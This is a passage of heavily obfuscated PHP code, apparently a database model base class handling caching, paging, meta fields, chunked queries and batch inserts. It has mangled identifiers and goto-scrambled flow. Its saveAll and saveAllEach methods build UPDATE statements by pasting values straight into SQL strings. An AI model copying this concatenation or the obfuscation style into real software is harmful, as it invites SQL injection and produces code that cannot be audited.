$Eø‘¬”¾ßÁ) { return $this->cacheFunctionGet($Eø‘¬”¾ßÁ, $B ÷²§¶¾); } if ($bãËîÔ && in_array($eİéÇŠéå, $cŞÃéÃ¹¼Ä)) { $this->cacheFunctionClear($Eø‘¬”¾ßÁ, $B ÷²§¶¾); } } } public function cacheFunctionGet($b¢í´ìƒİŠ, $bôØİ¶ìƒê) { $Dã˜‘Š¨Ğ» = $this->cacheKeyMake($b¢í´ìƒİŠ, $bôØİ¶ìƒê); $AÍ®ØÜ¢ğ = Cache::get($Dã˜‘Š¨Ğ»); if (!is_array($AÍ®ØÜ¢ğ)) { $AÍ®ØÜ¢ğ = call_user_func_array(array($this, $b¢í´ìƒİŠ), array($bôØİ¶ìƒê, !0)); Cache::set($Dã˜‘Š¨Ğ», $AÍ®ØÜ¢ğ); } return $AÍ®ØÜ¢ğ; } public function cacheFunctionClear($Fòé‹Ş§Ä¡, $FÄ¡¢ÒÈŸè) { $B¤‰Ù…šÔ¬ = $FÄ¡¢ÒÈŸè; if (!is_array($FÄ¡¢ÒÈŸè)) { $B¤‰Ù…šÔ¬ = array($FÄ¡¢ÒÈŸè); } foreach ($B¤‰Ù…šÔ¬ as $c’îª„Åİì) { $A•Š‹¦½©¡ = $this->cacheKeyMake($Fòé‹Ş§Ä¡, $c’îª„Åİì); Cache::remove($A•Š‹¦½©¡); } } private function cacheKeyMake($Cãù»¸’Ó¯, $Bí…¯’å¼Ç) { $eßğšÔĞÒ‰ =& $_SERVER[İë¬“ÅÒÛ›]; return get_class($this) . $eßğšÔĞÒ‰[71] . $Cãù»¸’Ó¯ . $eßğšÔĞÒ‰[351] . $Bí…¯’å¼Ç; } protected function selectPage($b‡•À¹èˆ = 200, $bçÖºŸ‘ó = 1) { goto F­‹„àÍÍŞ; F­‹„àÍÍŞ: $Eª°‚•¬…Ş =& $_SERVER[İë¬“ÅÒÛ›]; global $in; $B‡ÊùÌ¢¡Œ = $this->optionsValue(); goto aÆáÂ©Œ´Ã; aÆáÂ©Œ´Ã: $b¤•Ğ¾Œ¸ = 4000; $b‡•À¹èˆ = isset($in[$Eª°‚•¬…Ş[352]]) ? $in[$Eª°‚•¬…Ş[352]] : $b‡•À¹èˆ; if ($b‡•À¹èˆ === -1) { unset($in[$Eª°‚•¬…Ş[352]]); $b¤•Ğ¾Œ¸ = 100000000; $b‡•À¹èˆ = $b¤•Ğ¾Œ¸; } goto fÏ‚®Ï­±; b«å ÅíœŒ: $this->optionsValue($B‡ÊùÌ¢¡Œ); $B¸‚©İÇ¡á = $this->page($bçÖºŸ‘ó, $b‡•À¹èˆ)->select(); if ($Cø—­¤ñµ® == 1) { $F³É‹¾‘¡ = count($B¸‚©İÇ¡á); } goto BÆãÅ„½¢‹; fÏ‚®Ï­±: $Câ³Õó„Ü = $B‡ÊùÌ¢¡Œ; $Câ³Õó„Ü[$Eª°‚•¬…Ş[353]] = array(); $this->optionsValue($Câ³Õó„Ü); goto DÚ×êôÙ‡Ù; DÚ×êôÙ‡Ù: $F³É‹¾‘¡ = intval($this->count()); $b‡•À¹èˆ = intval($b‡•À¹èˆ); $b‡•À¹èˆ = $b‡•À¹èˆ <= 5 ? 5 : ($b‡•À¹èˆ >= $b¤•Ğ¾Œ¸ ? $b¤•Ğ¾Œ¸ : $b‡•À¹èˆ); goto Eğ‰Î¹ƒ˜; Eğ‰Î¹ƒ˜: $Cø—­¤ñµ® = ceil($F³É‹¾‘¡ / $b‡•À¹èˆ); $bçÖºŸ‘ó = intval(isset($in[$Eª°‚•¬…Ş[343]]) ? $in[$Eª°‚•¬…Ş[343]] : $bçÖºŸ‘ó); $bçÖºŸ‘ó = $bçÖºŸ‘ó <= 1 ? 1 : ($bçÖºŸ‘ó >= $Cø—­¤ñµ® ? $Cø—­¤ñµ® : $bçÖºŸ‘ó); goto b«å ÅíœŒ; BÆãÅ„½¢‹: $dƒÅÇÉŠ‰÷ = array($Eª°‚•¬…Ş[354] => array($Eª°‚•¬…Ş[355] => $F³É‹¾‘¡, $Eª°‚•¬…Ş[352] => $b‡•À¹èˆ, $Eª°‚•¬…Ş[343] => $bçÖºŸ‘ó, $Eª°‚•¬…Ş[356] => $Cø—­¤ñµ®), $Eª°‚•¬…Ş[357] => $B¸‚©İÇ¡á ? $B¸‚©İÇ¡á : array()); return $dƒÅÇÉŠ‰÷; goto f £½÷àá; f £½÷àá: } protected function metaSet($a¡ÆÑ¾Í¡“, $Bîôö¥›» = null, $f®Ü¢Ÿ‚ë = null) { goto a‰óƒ¬‘; a‰óƒ¬‘: $fš¾ÖÙÓ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$this->tableMeta) { return !1; } $DÑÈğËì¿“ = $this->tableMeta[$fš¾ÖÙÓ[358]]; goto Bëö¤ÎÓ…Ï; Bëö¤ÎÓ…Ï: $a›Î±­ëó™ = Model($this->tableMeta[$fš¾ÖÙÓ[359]]); if (is_array($Bîôö¥›»)) { $aëèÂ…Ÿ™ = array(); foreach ($Bîôö¥›» as $e–ÒÙâ™²ç => $D²ø†İòÁí) { $aëèÂ…Ÿ™[] = array($DÑÈğËì¿“ => $a¡ÆÑ¾Í¡“, $fš¾ÖÙÓ[88] => $e–ÒÙâ™²ç, $fš¾ÖÙÓ[360] => $D²ø†İòÁí); } $a›Î±­ëó™->where(array($DÑÈğËì¿“ => $a¡ÆÑ¾Í¡“))->addAll($aëèÂ…Ÿ™, array(), !0); return !0; } $dªôâ¥ÖŞœ = array($DÑÈğËì¿“ => $a¡ÆÑ¾Í¡“, $fš¾ÖÙÓ[361] => $Bîôö¥›»); goto A†½¯Ê¤ç; A†½¯Ê¤ç: if (is_null($Bîôö¥›»)) { return $a›Î±­ëó™->where(array($DÑÈğËì¿“ => $a¡ÆÑ¾Í¡“))->delete(); } if (is_null($f®Ü¢Ÿ‚ë)) { return $a›Î±­ëó™->where($dªôâ¥ÖŞœ)->delete(); } $dáÂ¢È„î› = !1; goto dÂŞğ›Œ§; dÂŞğ›Œ§: if ($a›Î±­ëó™->where($dªôâ¥ÖŞœ)->find()) { $dáÂ¢È„î› = $a›Î±­ëó™->where($dªôâ¥ÖŞœ)->save(array($fš¾ÖÙÓ[362] => $f®Ü¢Ÿ‚ë)); } else { $dªôâ¥ÖŞœ[$fš¾ÖÙÓ[360]] = $f®Ü¢Ÿ‚ë; $dáÂ¢È„î› = $a›Î±­ëó™->add($dªôâ¥ÖŞœ); } return $dáÂ¢È„î›; goto c°âÊù§©î; c°âÊù§©î: } public function metaGet($e§ÍÁôš¶©) { goto f´ŸâÁßó„; Bá…„¬åİ»: $bÀ³«Ô®Ÿô = array_to_keyvalue($bÀ³«Ô®Ÿô, $e—æ…Ÿ…¾[88], $e—æ…Ÿ…¾[360]); return $bÀ³«Ô®Ÿô; goto fÉÂæš…î; D³¤ëœöÙ: $B§‡Ò‡†¨µ = Model($this->tableMeta[$e—æ…Ÿ…¾[359]]); $eº‘Şì†Á = array($Cğ˜õÂ–Œ‰ => $e§ÍÁôš¶©); $bÀ³«Ô®Ÿô = $B§‡Ò‡†¨µ->field($e—æ…Ÿ…¾[363])->where($eº‘Şì†Á)->select(); goto Bá…„¬åİ»; f´ŸâÁßó„: $e—æ…Ÿ…¾ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$this->tableMeta) { return array(); } $Cğ˜õÂ–Œ‰ = $this->tableMeta[$e—æ…Ÿ…¾[358]]; goto D³¤ëœöÙ; fÉÂæš…î: } private function checkDataAutoHas($c„™¿ŠÇ¾) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $DŸÀœÄ‹ßè) { if (in_array($c„™¿ŠÇ¾, explode($_SERVER[İë¬“ÅÒÛ›][47], $DŸÀœÄ‹ßè[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$aßÄÔ¼Â÷, $d•×ïÕš¬) { $Aí‰Ó¶Å¥ =& $_SERVER[İë¬“ÅÒÛ›]; foreach ($this->dataAuto as $cŠ£ãÜ‡İË) { $CÓ±äÓÎÍ = $cŠ£ãÜ‡İË[0]; if (!in_array($d•×ïÕš¬, explode($Aí‰Ó¶Å¥[47], $cŠ£ãÜ‡İË[2]))) { continue; } switch (trim($cŠ£ãÜ‡İË[3])) { case $Aí‰Ó¶Å¥[313]: case $Aí‰Ó¶Å¥[314]: $BŒ”Œ¦ŸÎ£ = $cŠ£ãÜ‡İË[1]; $CÒïÁİ·« = isset($cŠ£ãÜ‡İË[4]) ? (array) $cŠ£ãÜ‡İË[4] : array(); if ($BŒ”Œ¦ŸÎ£ == $Aí‰Ó¶Å¥[190] && array_key_exists($CÓ±äÓÎÍ, $aßÄÔ¼Â÷)) { if (!$aßÄÔ¼Â÷[$CÓ±äÓÎÍ]) { unset($aßÄÔ¼Â÷[$CÓ±äÓÎÍ]); } break; } if (isset($aßÄÔ¼Â÷[$CÓ±äÓÎÍ])) { array_unshift($CÒïÁİ·«, $aßÄÔ¼Â÷[$CÓ±äÓÎÍ]); } if ($Aí‰Ó¶Å¥[313] == $cŠ£ãÜ‡İË[3]) { $aßÄÔ¼Â÷[$CÓ±äÓÎÍ] = call_user_func_array($BŒ”Œ¦ŸÎ£, $CÒïÁİ·«); } else { $aßÄÔ¼Â÷[$CÓ±äÓÎÍ] = call_user_func_array(array(&$this, $BŒ”Œ¦ŸÎ£), $CÒïÁİ·«); } break; case $Aí‰Ó¶Å¥[265]: $aßÄÔ¼Â÷[$CÓ±äÓÎÍ] = $aßÄÔ¼Â÷[$cŠ£ãÜ‡İË[1]]; break; case $Aí‰Ó¶Å¥[286]: if (isset($aßÄÔ¼Â÷[$CÓ±äÓÎÍ]) && !is_string($aßÄÔ¼Â÷[$CÓ±äÓÎÍ])) { $aßÄÔ¼Â÷[$CÓ±äÓÎÍ] = json_encode_force($aßÄÔ¼Â÷[$CÓ±äÓÎÍ]); } break; case $Aí‰Ó¶Å¥[315]: if ($aßÄÔ¼Â÷[$CÓ±äÓÎÍ] === $Aí‰Ó¶Å¥[33]) { unset($aßÄÔ¼Â÷[$CÓ±äÓÎÍ]); } break; case $Aí‰Ó¶Å¥[316]: $aßÄÔ¼Â÷[$CÓ±äÓÎÍ] = $cŠ£ãÜ‡İË[1]; default: break; } } if ($d•×ïÕš¬ == $Aí‰Ó¶Å¥[347]) { $fŒ¢‘ƒÎµ = strtolower($this->db->getDbType()); if (strpos($fŒ¢‘ƒÎµ, $Aí‰Ó¶Å¥[9]) !== 0) { return; } $b…Ó‡¾Èá½ = $this->field(!0)->fields; $c‘‘àÈ‰¯ò = $b…Ó‡¾Èá½[$Aí‰Ó¶Å¥[244]]; if (isset($b…Ó‡¾Èá½[$Aí‰Ó¶Å¥[243]])) { unset($c‘‘àÈ‰¯ò[$b…Ó‡¾Èá½[$Aí‰Ó¶Å¥[243]]]); } foreach ($c‘‘àÈ‰¯ò as $B¿Í“ƒè¼ => $d•×ïÕš¬) { if (!isset($aßÄÔ¼Â÷[$B¿Í“ƒè¼])) { $aßÄÔ¼Â÷[$B¿Í“ƒè¼] = $Aí‰Ó¶Å¥[33]; } } } } private function dataAfterFilter(&$BæÔÄˆ¿àƒ) { $f›¬Ù´£· =& $_SERVER[İë¬“ÅÒÛ›]; foreach ($this->dataAuto as $D¢„÷ŞÒâ˜) { $AØÌÍ®£Ş› = $D¢„÷ŞÒâ˜[0]; if (!in_array($f›¬Ù´£·[349], explode($f›¬Ù´£·[47], $D¢„÷ŞÒâ˜[2]))) { continue; } if (!isset($BæÔÄˆ¿àƒ[$AØÌÍ®£Ş›])) { continue; } switch (trim($D¢„÷ŞÒâ˜[3])) { case $f›¬Ù´£·[313]: case $f›¬Ù´£·[314]: $cñÚÀÔæ¿¢ = isset($D¢„÷ŞÒâ˜[4]) ? (array) $D¢„÷ŞÒâ˜[4] : array(); array_unshift($cñÚÀÔæ¿¢, $BæÔÄˆ¿àƒ[$AØÌÍ®£Ş›]); if ($f›¬Ù´£·[313] == $D¢„÷ŞÒâ˜[3]) { $BæÔÄˆ¿àƒ[$AØÌÍ®£Ş›] = call_user_func_array($D¢„÷ŞÒâ˜[1], $cñÚÀÔæ¿¢); } else { $BæÔÄˆ¿àƒ[$AØÌÍ®£Ş›] = call_user_func_array(array(&$this, $D¢„÷ŞÒâ˜[1]), $cñÚÀÔæ¿¢); } break; case $f›¬Ù´£·[265]: $BæÔÄˆ¿àƒ[$AØÌÍ®£Ş›] = $BæÔÄˆ¿àƒ[$D¢„÷ŞÒâ˜[1]]; break; case $f›¬Ù´£·[286]: $cÈÌì½ê¨Í = $BæÔÄˆ¿àƒ[$AØÌÍ®£Ş›]; $BæÔÄˆ¿àƒ[$AØÌÍ®£Ş›] = json_decode($cÈÌì½ê¨Í, !0); if (is_null($BæÔÄˆ¿àƒ[$AØÌÍ®£Ş›])) { $BæÔÄˆ¿àƒ[$AØÌÍ®£Ş›] = $cÈÌì½ê¨Í; } break; case $f›¬Ù´£·[315]: if ($BæÔÄˆ¿àƒ[$AØÌÍ®£Ş›] === $f›¬Ù´£·[33]) { unset($BæÔÄˆ¿àƒ[$AØÌÍ®£Ş›]); } break; case $f›¬Ù´£·[316]: $BæÔÄˆ¿àƒ[$AØÌÍ®£Ş›] = $D¢„÷ŞÒâ˜[1]; default: break; } } } public function saveAll($e³ö‰í­ç”) { goto a²‚ÎóÂÕ«; Aîò§àŠ“: $F‡œ¹šô¡ˆ = count($e³ö‰í­ç”); for ($fÓêˆÈ¢‚º = 0; $fÓêˆÈ¢‚º < $F‡œ¹šô¡ˆ; $fÓêˆÈ¢‚º++) { $E®ÖÁçôñÛ = $e³ö‰í­ç”[$fÓêˆÈ¢‚º]; if (!is_array($E®ÖÁçôñÛ) || count($E®ÖÁçôñÛ) != 4) { continue; } $BèÕ¼³¨î“ = "\x55\120\x44\101\x54\x45\40{$A§ÊÑŞ¹Ó³}\40\x53\x45\x54\40{$E®ÖÁçôñÛ[2]}\40\75\x20\x43\x41\123\105\40{$E®ÖÁçôñÛ[0]}\x20\xa"; if ($aÙãà„‚ù == 0) { $bà‚ÍÆ¥©ß = $BèÕ¼³¨î“; } $C¨Ğ­ÑÄ°[] = $CÙ™¹™„[112] . $E®ÖÁçôñÛ[1] . $CÙ™¹™„[112]; $aÙãà„‚ù++; $bà‚ÍÆ¥©ß .= "\x20\127\x48\x45\116\40\x27{$E®ÖÁçôñÛ[1]}\x27\x20\x54\110\105\x4e\40\x27{$E®ÖÁçôñÛ[3]}\x27\40\xa"; if ($aÙãà„‚ù == $A×ÆµĞÎ„Ë || $fÓêˆÈ¢‚º == $F‡œ¹šô¡ˆ - 1) { $D½ˆ›¼Ù£ê = implode($CÙ™¹™„[47], $C¨Ğ­ÑÄ°); $bà‚ÍÆ¥©ß .= "\40\105\x4e\x44\40\40\127\110\x45\x52\105\x20{$E®ÖÁçôñÛ[0]}\x20\x49\116\40\x28{$D½ˆ›¼Ù£ê}\x29\x20"; $this->execute($bà‚ÍÆ¥©ß); $aÙãà„‚ù = 0; $bà‚ÍÆ¥©ß = $BèÕ¼³¨î“; $C¨Ğ­ÑÄ° = array(); } } goto cŸ‚‹¢î«š; cíÚÏÄ˜: $bà‚ÍÆ¥©ß = $CÙ™¹™„[364]; $aÙãà„‚ù = 0; $C¨Ğ­ÑÄ° = array(); goto Aîò§àŠ“; a²‚ÎóÂÕ«: $CÙ™¹™„ =& $_SERVER[İë¬“ÅÒÛ›]; $A§ÊÑŞ¹Ó³ = $this->tablePrefix . $this->tableName; $A×ÆµĞÎ„Ë = self::SQL_WHERE_IN_CHUNK; goto cíÚÏÄ˜; cŸ‚‹¢î«š: } public function saveAllEach($eª¢×—Š÷æ) { $C»£éˆŠË· =& $_SERVER[İë¬“ÅÒÛ›]; $bÉÎŞë¿Í¿ = $this->tablePrefix . $this->tableName; foreach ($eª¢×—Š÷æ as $Fª»†íİŸğ) { if (!is_array($Fª»†íİŸğ) || count($Fª»†íİŸğ) != 4) { continue; } $e¸­Òñ¨“ê = $Fª»†íİŸğ[0] . $C»£éˆŠË·[365] . $Fª»†íİŸğ[1] . $C»£éˆŠË·[112]; $FšÚÑìÆã¹ = $Fª»†íİŸğ[2] . $C»£éˆŠË·[365] . $Fª»†íİŸğ[3] . $C»£éˆŠË·[112]; $cä ™µğœ‚ = "\x75\x70\x64\x61\x74\145\40{$bÉÎŞë¿Í¿}\40\x73\x65\164\40{$FšÚÑìÆã¹}\x20\167\150\x65\x72\x65\40{$e¸­Òñ¨“ê}\x3b"; $this->execute($cä ™µğœ‚); } } public function addAll($bÇíêáÛÊ², $e¼ËóÍ İ¿ = array(), $e’‘ˆïÇËà = false) { goto eñ¨ˆÜ³; CŞÑ§æŠœ‡: if (empty($bÇíêáÛÊ²)) { $this->error = think_lang($A¥¾Ô¨‘õ‰[263]); return !1; } $e¼ËóÍ İ¿ = $this->_parseOptions($e¼ËóÍ İ¿); foreach ($bÇíêáÛÊ² as $a–·¿ó‡ìã => $b¶àŒˆéĞ‹) { $bÇíêáÛÊ²[$a–·¿ó‡ìã] = $this->_facade($b¶àŒˆéĞ‹); $this->_beforeInsert($bÇíêáÛÊ²[$a–·¿ó‡ìã], $e¼ËóÍ İ¿); } goto cƒ™ïƒƒÒ; cƒ™ïƒƒÒ: if (method_exists($this->db, $A¥¾Ô¨‘õ‰[264])) { for ($c•Ù§É÷”í = 0; $c•Ù§É÷”í < count($bÇíêáÛÊ²); $c•Ù§É÷”í += $C£ĞËç‰Å) { $bÉ¶–ğ¿¡ = array_slice($bÇíêáÛÊ², $c•Ù§É÷”í, $C£ĞËç‰Å); if (!is_array($bÉ¶–ğ¿¡) || count($bÉ¶–ğ¿¡) == 0) { break; } $Fç Ç‰¸­ğ = $this->db->insertAll($bÉ¶–ğ¿¡, $e¼ËóÍ İ¿, $e’‘ˆïÇËà); } } else { $this->startTrans(); foreach ($bÇíêáÛÊ² as $a–·¿ó‡ìã => $b¶àŒˆéĞ‹) { $Fç Ç‰¸­ğ = $this->db->insert($b¶àŒˆéĞ‹, $e¼ËóÍ İ¿, $e’‘ˆïÇËà); } $this->commit(); } if (!1 !== $Fç Ç‰¸­ğ) { $e×·ä‹Ìñ­ = $this->getLastInsID(); if ($e×·ä‹Ìñ­) { return $e×·ä‹Ìñ­; } } return $Fç Ç‰¸­ğ; goto BÏôÑ©Ûº; eñ¨ˆÜ³: $A¥¾Ô¨‘õ‰ =& $_SERVER[İë¬“ÅÒÛ›]; ignore_timeout(); $C£ĞËç‰Å = self::SQL_WHERE_IN_CHUNK; goto CŞÑ§æŠœ‡; BÏôÑ©Ûº: } public function save($bˆóöÀÙÁğ = '', $CºÃµ•œ = array()) { goto b¾öº—„íŞ; c‰¨õ‰ÎÛ: $f§ˆÓöÆëÚ = $E¡”ŒÑÔ°[$EÌ‚Í•™[267]][$BéâÔ¸—˜][1]; $FÜƒŒÓçœ³ = count($f§ˆÓöÆëÚ); for ($a«ÂÀ¼‰·Ê = 0; $a«ÂÀ¼‰·Ê < $FÜƒŒÓçœ³; $a«ÂÀ¼‰·Ê += $c¶ª¥¥¨İ) { $B‚â´¢²ùÇ = array_slice($f§ˆÓöÆëÚ, $a«ÂÀ¼‰·Ê, $c¶ª¥¥¨İ); if (!is_array($B‚â´¢²ùÇ) || count($B‚â´¢²ùÇ) == 0) { break; } $E¡”ŒÑÔ°[$EÌ‚Í•™[267]][$BéâÔ¸—˜][1] = $B‚â´¢²ùÇ; $this->optionsValue($E¡”ŒÑÔ°); $DîÇñó¾¿ += parent::save($bˆóöÀÙÁğ, $CºÃµ•œ); } goto c’ËİãàŞØ; BÚøÍ¦ÔÒà: $BéâÔ¸—˜ = $this->findWhereField($E¡”ŒÑÔ°); if (!$BéâÔ¸—˜) { return parent::save($bˆóöÀÙÁğ, $CºÃµ•œ); } $DîÇñó¾¿ = 0; goto c‰¨õ‰ÎÛ; b¾öº—„íŞ: $EÌ‚Í•™ =& $_SERVER[İë¬“ÅÒÛ›]; $c¶ª¥¥¨İ = self::SQL_WHERE_IN_CHUNK; $E¡”ŒÑÔ° = $this->optionsValue(); goto BÚøÍ¦ÔÒà; c’ËİãàŞØ: return $DîÇñó¾¿; goto båê¡ÑÛÅ‡; båê¡ÑÛÅ‡: } public function add($AŠàß›Ğ¾ = '', $d¥¾©Û¼À¯ = array(), $D“‰öï†ˆª = false) { if ($this->addTaskStatus && is_array($AŠàß›Ğ¾)) { $this->addTaskData[] = $AŠàß›Ğ¾; return; } return parent::add($AŠàß›Ğ¾, $d¥¾©Û¼À¯, $D“‰öï†ˆª); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($CŸóºİí‹¾ = array()) { goto B× øù“§; B× øù“§: $Fª§İØÎ× =& $_SERVER[İë¬“ÅÒÛ›]; $e¼Âè•²¼â = self::SQL_WHERE_IN_CHUNK; $aÑÆˆàã’ = $this->optionsValue(); goto cŒ®ôÜÙ¡Ÿ; cŒ®ôÜÙ¡Ÿ: $aÏ®‡çõÌ× = $this->findWhereField($aÑÆˆàã’); if (!$aÏ®‡çõÌ× || isset($aÑÆˆàã’[$Fª§İØÎ×[284]]) || isset($aÑÆˆàã’[$Fª§İØÎ×[343]])) { return parent::select($CŸóºİí‹¾); } $dõ·Š…Šõé = $aÑÆˆàã’[$Fª§İØÎ×[267]][$aÏ®‡çõÌ×][1]; goto b‚Îµö×‡Î; b‚Îµö×‡Î: $dÀİìªœ = null; for ($dƒ©©õÃä¤ = 0; $dƒ©©õÃä¤ < count($dõ·Š…Šõé); $dƒ©©õÃä¤ += $e¼Âè•²¼â) { $fË®ÔÁ…´Ò = array_slice($dõ·Š…Šõé, $dƒ©©õÃä¤, $e¼Âè•²¼â); if (!is_array($fË®ÔÁ…´Ò) || count($fË®ÔÁ…´Ò) == 0) { break; } $aÑÆˆàã’[$Fª§İØÎ×[267]][$aÏ®‡çõÌ×][1] = $fË®ÔÁ…´Ò; $this->optionsValue($aÑÆˆàã’); $c¥Œ¡²ƒ = parent::select($CŸóºİí‹¾); if (!$c¥Œ¡²ƒ) { continue; } if (is_null($dÀİìªœ)) { $dÀİìªœ = array(); } $dÀİìªœ = array_merge($dÀİìªœ, $c¥Œ¡²ƒ); } return $dÀİìªœ; goto AÒ•÷™¾¬; AÒ•÷™¾¬: } public function delete($A¢ùÌÜÏ­ò = array()) { goto CğÉ‹´‹ô…; A‡íÊ ¨¨: $fÑšŸîğ’‘ = $this->findWhereField($Cæ—‘È§÷º); if (!$fÑšŸîğ’‘) { return parent::delete($A¢ùÌÜÏ­ò); } $aå½ëœï = 0; goto a‹Š“Ğô…¬; CğÉ‹´‹ô…: $aòÖò‚–Ü =& $_SERVER[İë¬“ÅÒÛ›]; $a„Ü–…ò°º = self::SQL_WHERE_IN_CHUNK; $Cæ—‘È§÷º = $this->optionsValue(); goto A‡íÊ ¨¨; a‹Š“Ğô…¬: $DË÷óÈÔ» = $Cæ—‘È§÷º[$aòÖò‚–Ü[267]][$fÑšŸîğ’‘][1]; for ($BšÊŒÔø÷„ = 0; $BšÊŒÔø÷„ < count($DË÷óÈÔ»); $BšÊŒÔø÷„ += $a„Ü–…ò°º) { $aÜãˆ‹ªŒÏ = array_slice($DË÷óÈÔ», $BšÊŒÔø÷„, $a„Ü–…ò°º); if (!is_array($aÜãˆ‹ªŒÏ) || count($aÜãˆ‹ªŒÏ) == 0) { break; } $Cæ—‘È§÷º[$aòÖò‚–Ü[267]][$fÑšŸîğ’‘][1] = $aÜãˆ‹ªŒÏ; $this->optionsValue($Cæ—‘È§÷º); $aå½ëœï += parent::delete($A¢ùÌÜÏ­ò); } return $aå½ëœï; goto b¦İ–¤ÆËª; b¦İ–¤ÆËª: } private function findWhereField($dÇ¸…ÓèÆ) { $DÌ‰•ëÔ„¢ =& $_SERVER[İë¬“ÅÒÛ›]; $BÇÄø¸ˆó = self::SQL_WHERE_IN_CHUNK; if (!is_array($dÇ¸…ÓèÆ) || !is_array($dÇ¸…ÓèÆ[$DÌ‰•ëÔ„¢[267]])) { return !1; } foreach ($dÇ¸…ÓèÆ[$DÌ‰•ëÔ„¢[267]] as $DëÔª©µË• => $Dí’‘’™è„) { if (is_array($Dí’‘’™è„) && isset($Dí’‘’™è„[0]) && is_string($Dí’‘’™è„[0]) && strtolower($Dí’‘’™è„[0]) == $DÌ‰•ëÔ„¢[7] && is_array($Dí’‘’™è„[1]) && count($Dí’‘’™è„[1]) > $BÇÄø¸ˆó) { ignore_timeout(); return $DëÔª©µË•; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\x65\x6d\117\x70\164\x69\x6f\156"; public $field = array(); public function listData($D¹—éº¶À = false, $A¡Ì‚ø†ÊÖ = "\x6d\x6f\144\x69\x66\171\124\151\155\x65", $bùˆñ”Ê±Å = false) { $CâĞº–»Á = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$D¹—éº¶À) { $CâĞº–»Á = array_filter(array_values($CâĞº–»Á)); return array_sort_by($CâĞº–»Á, $A¡Ì‚ø†ÊÖ, $bùˆñ”Ê±Å); } return $CâĞº–»Á[$_SERVER[İë¬“ÅÒÛ›][366] . $D¹—éº¶À]; } public function insert($e–Èóæ¢ÌÎ) { goto B„Ç½ãªµ¦; B£Æˆµö ¯: $e–Èóæ¢ÌÎ[$D»¤Ü’ÉºÔ[106]] = time(); Model($this->modelType)->set($D»¤Ü’ÉºÔ[367], $b‚ñÜ¶×, $this->optionType . $D»¤Ü’ÉºÔ[368]); Model($this->modelType)->set($D»¤Ü’ÉºÔ[366] . $b‚ñÜ¶×, $e–Èóæ¢ÌÎ, $this->optionType); goto c°ñá©ŸÊÒ; FÉ»“ïõ†Ú: $b‚ñÜ¶× = $b‚ñÜ¶× ? $b‚ñÜ¶× : 0; $e–Èóæ¢ÌÎ[$D»¤Ü’ÉºÔ[369]] = ++$b‚ñÜ¶×; $e–Èóæ¢ÌÎ[$D»¤Ü’ÉºÔ[187]] = time(); goto B£Æˆµö ¯; B„Ç½ãªµ¦: $D»¤Ü’ÉºÔ =& $_SERVER[İë¬“ÅÒÛ›]; $e–Èóæ¢ÌÎ = array_field_key($e–Èóæ¢ÌÎ, $this->field); $b‚ñÜ¶× = Model($this->modelType)->get($D»¤Ü’ÉºÔ[367], $this->optionType . $D»¤Ü’ÉºÔ[368]); goto FÉ»“ïõ†Ú; c°ñá©ŸÊÒ: return $b‚ñÜ¶×; goto aÀŠŒ ‡¿Ò; aÀŠŒ ‡¿Ò: } public function update($b—†­å…, $D«ÑÊ‰¤ë–) { goto Dİ“Ãó›„İ; Dİ“Ãó›„İ: $D¾Ú¸¦Ç =& $_SERVER[İë¬“ÅÒÛ›]; $D«ÑÊ‰¤ë– = array_field_key($D«ÑÊ‰¤ë–, $this->field); $FÇ„ŸÉé¤ = $this->listData($b—†­å…); goto CˆÛøåĞ—; e­“Ù™ÕÃ²: return Model($this->modelType)->set($D¾Ú¸¦Ç[366] . $b—†­å…, $D«ÑÊ‰¤ë–, $this->optionType); goto E¨ì¾®´Ò­; CˆÛøåĞ—: if (!$FÇ„ŸÉé¤) { return !1; } $D«ÑÊ‰¤ë– = array_merge($FÇ„ŸÉé¤, $D«ÑÊ‰¤ë–); $D«ÑÊ‰¤ë–[$D¾Ú¸¦Ç[106]] = time(); goto e­“Ù™ÕÃ²; E¨ì¾®´Ò­: } public function remove($f½ÇÜŒÔä‡) { return Model($this->modelType)->remove($_SERVER[İë¬“ÅÒÛ›][366] . $f½ÇÜŒÔä‡, $this->optionType); } public function clear() { $D¥Ï‹…œŸ• =& $_SERVER[İë¬“ÅÒÛ›]; Model($this->modelType)->remove($D¥Ï‹…œŸ•[367], $this->optionType . $D¥Ï‹…œŸ•[368]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($D‹æ«¦àõ, $cª†½À£İø) { if (!$cª†½À£İø) { return !1; } $cË°ó‡ÆµÅ = $this->listData(); $cË°ó‡ÆµÅ = array_to_keyvalue($cË°ó‡ÆµÅ, $D‹æ«¦àõ); return isset($cË°ó‡ÆµÅ[$cª†½À£İø]) ? $cË°ó‡ÆµÅ[$cª†½À£İø] : !1; } public function findByName($FˆÈè—Ã£) { return $this->findByKey($_SERVER[İë¬“ÅÒÛ›][28], $FˆÈè—Ã£); } protected function resetData($c­’Ê©ÒƒÊ) { $CÜ±õÄÒİÑ =& $_SERVER[İë¬“ÅÒÛ›]; $b‘ˆŒßì»º = array(); for ($C˜Äê«‘ã™ = 0; $C˜Äê«‘ã™ < count($c­’Ê©ÒƒÊ); $C˜Äê«‘ã™++) { $b‘ˆŒßì»º[$CÜ±õÄÒİÑ[366] . $c­’Ê©ÒƒÊ[$C˜Äê«‘ã™][$CÜ±õÄÒİÑ[369]]] = $c­’Ê©ÒƒÊ[$C˜Äê«‘ã™]; } return Model($this->modelType)->set($b‘ˆŒßì»º, !1, $this->optionType); } private function getAutoName($Fğ³˜£±í·) { $C×ĞÅ”…ñÚ = array_to_keyvalue($this->listData(), $_SERVER[İë¬“ÅÒÛ›][28]); if (!$C×ĞÅ”…ñÚ || !isset($C×ĞÅ”…ñÚ[$Fğ³˜£±í·])) { return $Fğ³˜£±í·; } for ($B¸µ®îÂó = 1; $B¸µ®îÂó < count($C×ĞÅ”…ñÚ); $B¸µ®îÂó++) { $Cµ‡Ÿâ¦‰„ = $Fğ³˜£±í· . "\x28{$B¸µ®îÂó}\51"; if (!isset($C×ĞÅ”…ñÚ[$Cµ‡Ÿâ¦‰„])) 